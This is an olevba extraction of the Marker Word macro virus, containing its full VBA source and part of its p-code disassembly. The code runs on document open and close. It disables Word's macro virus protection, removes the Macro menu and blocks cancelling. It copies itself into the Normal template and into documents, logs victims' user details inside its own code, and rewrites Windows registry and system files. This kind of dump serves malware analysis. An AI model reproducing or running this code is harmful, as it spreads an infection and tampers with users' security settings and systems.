olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.db
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.db - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs2000"
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 1 Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0
        CommandBars("Tools").Controls("Macro").Delete
    Else
        CommandBars("Tools").Controls("Macro").Delete
    End If
    Options.VirusProtection = False
    If Month(Now) = 1 And Day(Now) < 10 Then Message$ = "HaPpy NeW YeaR ! From : «(¤¿¤)» Me !"
        If Day(Now) = ((64 / 8) - 2 + 10 - (6 + 2)) And Month(Now) = ((30 / 6) + (4 / 2) + 4 - 5) Then Message$ = "Today Is My Birthday ! Thank's For Your Greeting..."
            If Day(Now) = ((25 / 5) - 2 + 10 + 14) And Month(Now) = (2 ^ 5) - 30 + 5 Then Message$ = "Happy Birthday Honey, I Love U So Much..."
                If Day(Now) = (3 ^ 6) - 700 + (2 ^ 3) - 22 And Month(Now) = (5 ^ 3) - 120 + 7 Then Message$ = "Happy Birthday, Son ! Be a Good Boy..."
                    If Message$ <> "" Then MsgBox Message$, vbInformation, "From : <(¤¿¤)>"
    Message$ = ""
    Document_Close
End Sub
Private Sub Document_Close()
    Dim nmod As Object
    Dim isd As String
    Dim DS, NTS, DI, NTI As Boolean
    Dim EmailMe, Users, LogData, LogFile As String
    On Error Resume Next
    AddIns.Unload True
    Application.UserName = "fs080298"
    Application.UserInitials = "FS2000"
    Application.UserAddress = "fs080298@yeayea.com"
    Application.EnableCancelKey = wdCancelDisabled
    GoSub Sisipin
    If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
    "LogData in") = False) Then GoSub LoggingIn
    GoSub EmailMePlease
    GoTo Finish
    
Sisipin:
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If DI Then
            NTS = NormalTemplate.Saved
            EmailMe = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
        For i = 1 To Len(Application.UserAddress)
            If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
                If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
                    Users = Users & Mid(Application.UserAddress, i, 1)
                End If
            Else
                Users = Users & Chr(13) & " '"
            End If
        Next
    EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString EmailMe
    If NTS Then NormalTemplate.Save
    End If
    If NTI Then
        DS = ActiveDocument.Saved
        EmailMe = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
        AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
        AD.CodeModule.AddFromString EmailMe
        If DS Then ActiveDocument.Save
        End If
    End If
    Return
    
LoggingIn:
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
    GoSub EmailMePlease
    Return

EmailMePlease:
    Dim SystemRoot As String
    On Error Resume Next
    SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = Chr$(60) + Chr$(40) + Chr$(164) + Chr$(191) + Chr$(164) + Chr$(41) + Chr$(62)
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
                System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "FS080298"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "FaN's Comp. 2000"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Hi ! <(¤¿¤)> It's Me !"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductId") = "Feb 8, 1998 -> Dec 15, 1998"
    Open SystemRoot & "\EmailMe.html" For Output As #1
        Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
        Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
        Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
        Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p><br><br><br><br><br></p>"
        Print #1, "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
        Print #1, "<Script Language='VBS'>"
        Print #1, "Sub button1_onClick()"
        Print #1, "alert " + Chr$(34) + "I Said : Don`t Press Me ! Can`t You Read ?" + Chr$(34)
        Print #1, "End Sub"
        Print #1, "</script>"
        Print #1, "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
    Close #1
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = Chr$(60) + Chr$(40) + Chr$(169) + Chr$(191) + Chr$(169) + Chr$(41) + Chr$(62)
        If System.Version = 4.1 Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "InfoTip") = "Hi ! «(¤¿¤)» Have a Nice Day..."
        Else
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
        End If
    myoem = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") + Chr$(92) + Chr$(83) + Chr$(121) + Chr$(115) + Chr$(116) + Chr$(101) + Chr$(109)
    myini$ = Chr$(92) + Chr$(79) + Chr$(101) + Chr$(109) + Chr$(105) + Chr$(110) + Chr$(102) + Chr$(111) + Chr$(46) + Chr$(105) + Chr$(110) + Chr$(105)
    Open myoem & myini$ For Output As #2
        Print #2, "[general]"
        Print #2, "Manufacturer=FS080298 CORP. 98"
        Print #2, "Model=Son, I Love You So Much !"
        Print #2, ""
        Print #2, "[Support Information]"
        Print #2, "Line1=THank`s For Looking My Wallpaper (Win98x Only)"
        Print #2, "Line2=My Program Is Not DANGER !"
        Print #2, "Line3=Don`t Worry !!!"
        Print #2, "Line4="
        Print #2, "Line5=Do You Have Any Comments ?"
        Print #2, "Line6=Please Send Your Email to : fs080298@yeayea.com"
        Print #2, "Line7=:-)"
    Close #2
Return
Finish:
End Sub

'THank's 4 Looking My Wallpaper (Win98x Only)
'Log File ->

' 07:03:2007:03:20 <(¤¿¤)> <(¤¿¤)>-Thursday, 16 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 09:22:539:22:53 Sore Sore-Wednesday, 22 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 08:26:528:26:52 -Minggu, 26 Des 1999
' fs080298
' fs080298@yeayea.com

 


' 08:12:458:12:45 PM PM-Monday, 27 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 02:28:132:28:13 PM PM-Tuesday, 4 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 04:56:84:56:08 PM PM-Wednesday, 26 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 04:26:94:26:09 PM PM-Saturday, 29 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 10:09:2310:09:23 AM AM-Monday, 31 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 09:33:149:33:14 AM AM-Tuesday, 1 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 01:41:11:41:01 PM PM-Thursday, 24 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 03:56:33:56:03 PM PM-Friday, 25 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 10:54:5910:54:59 AM AM-Tuesday, 29 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 06:36:466:36:46 PM PM-Tuesday, 29 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 11:42:3623:42:36 -Donnerstag, 1 Jun 2000
' fs080298
' fs080298@yeayea.com

 

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.db
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 22439 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Son, Be a Good Boy !"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x001E "<- this is a marker! by fs2000"
' 	VarDefn Marker
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0024 "HaPpy NeW YeaR ! From : «(¤¿¤)» Me !"
' 	St Message$ 
' 	EndIf 
' Line #12:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0040 
' 	LitDI2 0x0008 
' 	Div 
' 	Paren 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x000A 
' 	Add 
' 	LitDI2 0x0006 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Sub 
' 	Paren 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x001E 
' 	LitDI2 0x0006 
' 	Div 
' 	Paren 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0004 
' 	Add 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0033 "Today Is My Birthday ! Thank's For Your Greeting..."
' 	St Message$ 
' 	EndIf 
' Line #13:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	LitDI2 0x0005 
' 	Div 
' 	Paren 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x000A 
' 	Add 
' 	LitDI2 0x000E 
' 	Add 
' 	Paren 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	Pwr 
' 	Paren 
' 	LitDI2 0x001E 
' 	Sub 
' 	LitDI2 0x0005 
' 	Add 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0029 "Happy Birthday Honey, I Love U So Much..."
' 	St Message$ 
' 	EndIf 
' Line #14:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0006 
' 	Pwr 
' 	Paren 
' 	LitDI2 0x02BC 
' 	Sub 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	Pwr 
' 	Paren 
' 	Add 
' 	LitDI2 0x0016 
' 	Sub 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0003 
' 	Pwr 
' 	Paren 
' 	LitDI2 0x0078 
' 	Sub 
' 	LitDI2 0x0007 
' 	Add 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0026 "Happy Birthday, Son ! Be a Good Boy..."
' 	St Message$ 
' 	EndIf 
' Line #15:
' 	Ld Message$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Message$ 
' 	Ld vbInformation 
' 	LitStr 0x000E "From : <(¤¿¤)>"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #16:
' 	LitStr 0x0000 ""
' 	St Message$ 
' Line #17:
' 	ArgsCall Document_Close 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub Document_Close())
' Line #20:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #21:
' 	Dim 
' 	VarDefn isd (As String)
' Line #22:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #23:
' 	Dim 
' 	VarDefn EmailMe
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #26:
' 	LitStr 0x0008 "fs080298"
' 	Ld Application 
' 	MemSt UserName 
' Line #27:
' 	LitStr 0x0006 "FS2000"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #28:
' 	LitStr 0x0013 "fs080298@yeayea.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #29:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #30:
' 	GoSub Sisipin 
' Line #31:
' 	LineCont 0x0004 0A 00 04 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #32:
' 	GoSub EmailMePlease 
' Line #33:
' 	GoTo Finish 
' Line #34:
' Line #35:
' 	Label Sisipin 
' Line #36:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #38:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #39:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #40:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld DI 
' 	IfBlock 
' Line #42:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #45:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #46:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #47:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld EmailMe 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St EmailMe 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #55:
' 	Ld EmailMe 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #56:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld NTI 
' 	IfBlock 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #62:
' 	Ld EmailMe 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #63:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Return 
' Line #67:
' Line #68:
' 	Label LoggingIn 
' Line #69:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #70:
' 	GoSub EmailMePlease 
' Line #71:
' 	Return 
' Line #72:
' Line #73:
' 	Label EmailMePlease 
' Line #74:
' 	Dim 
' 	VarDefn SystemRoot (As String)
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SystemRoot 
' Line #77:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #78:
' 	LitStr 0x000B "HH:mm:ss tt"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x000B "sTimeFormat"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #79:
' 	LitStr 0x0008 "FS080298"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000B "ProductName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #80:
' 	LitStr 0x0010 "FaN's Comp. 2000"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #81:
' 	LitStr 0x0016 "Hi ! <(¤¿¤)> It's Me !"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	LitStr 0x001B "Feb 8, 1998 -> Dec 15, 1998"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0009 "ProductId"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #83:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B0 "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00C6 "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006E "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "<p><br><br><br><br><br></p>"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "<Script Language='VBS'>"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Sub button1_onClick()"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
